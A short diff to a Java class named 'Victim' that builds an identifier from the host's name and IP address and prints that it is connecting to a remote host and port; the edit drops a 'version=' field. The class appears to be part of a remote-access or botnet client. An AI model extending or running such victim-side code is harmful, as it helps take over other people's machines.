@@ -53,7 +53,7 @@ public class Victim implements Runnable {
         } catch (Exception e) {
             ip = "noip";
         }
-        whoami = hostname + "@" + ip + " " + "version=" + " ";
+        whoami = hostname + "@" + ip + " ";
 
         System.out.println("Connecting to " + host + " on port " + port_number + "...");
 
